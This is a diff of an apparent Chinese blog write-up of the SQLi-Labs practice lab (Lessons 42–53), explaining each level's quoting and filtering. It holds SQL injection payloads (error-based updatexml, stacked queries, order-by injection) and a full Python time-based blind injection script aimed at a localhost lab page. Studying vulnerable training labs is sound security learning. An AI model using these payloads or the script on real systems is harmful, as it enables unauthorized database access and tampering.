@@ -290,9 +290,110 @@ echo $string;</code></pre><p>escape 转义反斜杠为什么需要 “\\\“ 六
 <pre><code>?id=&#39;&#39;;create table test like users%23</code></pre><h2 id="Lesson-42"><a href="#Lesson-42" class="headerlink" title="Lesson 42"></a>Lesson 42</h2><p>报错注入，单引号闭合，login_user 有 mysql_real_escape_string( ) 函数过滤，在 login_password 处注入。<br>payload:</p>
 <pre><code>login_user=1&amp;login_password=&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&amp;mysubmit=Login</code></pre><p>奇怪的是这题目 hackerbar POST 不过去？只好在登陆框注入。</p>
 <p>也可以使用堆叠注入。<br>payload:</p>
-<pre><code>&#39;;create table test like users #</code></pre><h2 id="Lesson-43"><a href="#Lesson-43" class="headerlink" title="Lesson 43"></a>Lesson 43</h2><p>跟上一题类似，报错注入，改为’)闭合。<br>payload:</p>
+<pre><code>&#39;;create table test like users #</code></pre><h2 id="Lesson-43"><a href="#Lesson-43" class="headerlink" title="Lesson 43"></a>Lesson 43</h2><p>login_user 有 mysql_real_escape_string( )函数过滤，以 login_password 为注入点。<br>跟上一题类似，报错注入，改为’)闭合。<br>payload:</p>
 <pre><code>login_user=1&amp;login_password=&#39;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&amp;mysubmit=Login</code></pre><p>堆叠注入。<br>payload:</p>
-<pre><code>&#39;);create table test like users #</code></pre><h2 id="Lesson-44"><a href="#Lesson-44" class="headerlink" title="Lesson 44"></a>Lesson 44</h2>
+<pre><code>&#39;);create table test like users #</code></pre><h2 id="Lesson-44"><a href="#Lesson-44" class="headerlink" title="Lesson 44"></a>Lesson 44</h2><p>堆叠注入，login_user 有 mysql_real_escape_string( )函数过滤，以 login_password 为注入点。<br>POST 传值，单引号闭合。<br>payload:</p>
+<pre><code>login_user=admin&amp;login_password=&#39;;create table test like users #&amp;mysubmit=Login</code></pre><p>时间盲注亦可。</p>
+<h2 id="Lesson-45"><a href="#Lesson-45" class="headerlink" title="Lesson 45"></a>Lesson 45</h2><p>跟上一题相同，唯一不同的在于变成了 ‘) 闭合。<br>payload:</p>
+<pre><code>login_user=admin&amp;login_password=&#39;);create table test like users #&amp;mysubmit=Login</code></pre><p>时间盲注亦可。</p>
+<h2 id="Lesson-46"><a href="#Lesson-46" class="headerlink" title="Lesson 46"></a>Lesson 46</h2><p>order by 注入。什么是 order by 注入？</p>
+<p>可控制的位置在order by子句后，如下order参数可控：select * from goods order by $_GET[‘sort’]</p>
+<p>报错注入。<br>尽管如此，由于存在 print_error ，依然可以使用报错注入。GET 传值，单引号屏蔽。<br>payload:</p>
+<pre><code>?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</code></pre><p>这题亦可以使用盲注。</p>
+<p>这里出现了 mysql_fetch_assoc( ) 函数，顺便查看一下手册。<br><img src="/images/Sqli_Lab_Learning/mysql_fetch_assoc.png" alt></p>
+<h2 id="Lesson-47"><a href="#Lesson-47" class="headerlink" title="Lesson 47"></a>Lesson 47</h2><p>和上一题相同，唯一区别在于这题为单引号闭合。</p>
+<p>报错注入。<br>payload:</p>
+<pre><code>?sort=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><p>时间盲注亦可。</p>
+<h2 id="Lesson-48"><a href="#Lesson-48" class="headerlink" title="Lesson 48"></a>Lesson 48</h2><p>order by 注入。<br>由于没有报错提示，仅能进行时间盲注。GET 传值，无闭合。<br>exp：</p>
+<pre><code># -*- coding:utf-8 -*-
+import sys
+import time
+import requests
+
+
+def getPayload(result_index, char_index, ascii):
+    # 系统表中数据
+    info_database_name = &quot;information_schema&quot;
+    info_table_name = &quot;tables&quot;  # schemata / tables / columns
+    info_column_name = &quot;table_name&quot;  # schema_name / table_name / column_name
+
+    # 注入表中数据
+    database_name = &quot;security&quot;
+    table_name = &quot;users&quot;
+    column_name = [&quot;id&quot;, &quot;username&quot;, &quot;password&quot;]
+
+    # 连接select
+    where_str = &quot; where table_schema=database()&quot;
+    # where_str = &quot; where table_schema=&#39;&quot;+database_name+&quot;&#39;&quot;+&quot; and table_name=&#39;&quot;+table_name+&quot;&#39;&quot;
+    select_str = &quot;select &quot; + info_column_name + &quot; from &quot; + info_database_name + &quot;.&quot; + info_table_name + where_str + &quot; limit &quot; + str(
+        result_index) + &quot;,1&quot;
+    # select_str = &quot;select concat_ws(&#39;-&#39;,&quot;+column_name[0]+&quot;,&quot;+column_name[1]+&quot;,&quot;+column_name[2]+&quot;) from &quot;+table_name+&quot; limit &quot;+str(result_index)+&quot;,1&quot;
+
+    # 连接payload
+    sqli_str = &quot;if(ascii(mid((&quot; + select_str + &quot;),&quot; + str(char_index) + &quot;,1))=&quot; + str(ascii) + &quot;,sleep(0.2),0)&quot;
+    payload = &quot;?sort=1&quot; + &quot; and &quot; + sqli_str + &quot;%23&quot;
+    return payload
+
+
+def execute(result_index, char_index, ascii):
+    # 连接url
+    url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-48/index.php&quot;
+    payload = getPayload(result_index, char_index, ascii)
+    # print(payload)
+    # 检查延时
+    before_time = time.time()
+    url = url + payload
+    response = requests.get(url)
+    # print(response.text)
+    after_time = time.time()
+    use_time = after_time - before_time
+    if use_time &gt; 0.1:
+        return True
+    else:
+        return False
+
+
+def exhaustive(result_index, char_index):
+    # ascii可显字符从32到126共95个 按可能性顺序
+    ascii_list = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;,
+                  &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;,
+                  &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39; &#39;, &#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;,
+                  &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;:&#39;,
+                  &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;]
+    for ascii_char in ascii_list:
+        ascii = ord(ascii_char)
+        if execute(str(result_index), str(char_index + 1), str(ascii)):
+            return ascii_char
+    return chr(1)
+
+
+if __name__ == &quot;__main__&quot;:
+    for num in range(32):  # 查询结果的数量
+        count = 0
+        for len in range(32):  # 单条查询结果的长度
+            count += 1
+            char = exhaustive(num, len)
+            if ord(char) == 1:  # 单条查询结果已被遍历
+                break
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        if count == 1:  # 查询结果已被遍历
+            break
+        sys.stdout.write(&quot;\r\n&quot;)
+        sys.stdout.flush()
+</code></pre><h2 id="Lesson-49"><a href="#Lesson-49" class="headerlink" title="Lesson 49"></a>Lesson 49</h2><p>与上一题相同，唯一的区别是变成了单引号闭合。<br>时间盲注，exp 就不放上来了。</p>
+<h2 id="Lesson-50"><a href="#Lesson-50" class="headerlink" title="Lesson 50"></a>Lesson 50</h2><p>存在 mysqli_multi_query( ) 函数，所以存在堆叠注入。</p>
+<p>堆叠注入<br>payload:</p>
+<pre><code>?sort=1;create table test like users %23</code></pre><p>亦可以使用报错注入。GET 传值，无闭合。<br>payload：</p>
+<pre><code>?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</code></pre><p>盲注亦可。</p>
+<h2 id="Lesson-51"><a href="#Lesson-51" class="headerlink" title="Lesson 51"></a>Lesson 51</h2><p>跟上一题相同，唯一区别在于这题为单引号闭合。</p>
+<p>报错注入。<br>payload:</p>
+<pre><code>?sort=1 &#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</code></pre><h2 id="Lesson-52"><a href="#Lesson-52" class="headerlink" title="Lesson 52"></a>Lesson 52</h2><p>无报错。存在堆叠注入和时间盲注。</p>
+<p>堆叠注入，GET 传值，无闭合。<br>payload:</p>
+<pre><code>?sort=1;create table test like users </code></pre><p>时间盲注，exp 同 Lesson 48。</p>
+<h2 id="Lesson-53"><a href="#Lesson-53" class="headerlink" title="Lesson 53"></a>Lesson 53</h2><p>跟上一题相同，存在堆叠注入和时间盲注，唯一区别在于这题为单引号闭合。<br>堆叠注入，GET 传值，单引号闭合。<br>payload:</p>
+<pre><code>?sort=1&#39;;create table test like users %23</code></pre><p>时间盲注，exp 同 Lessson 49。</p>
+<h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1>
                             <hr>
                         </div>
                         <br>
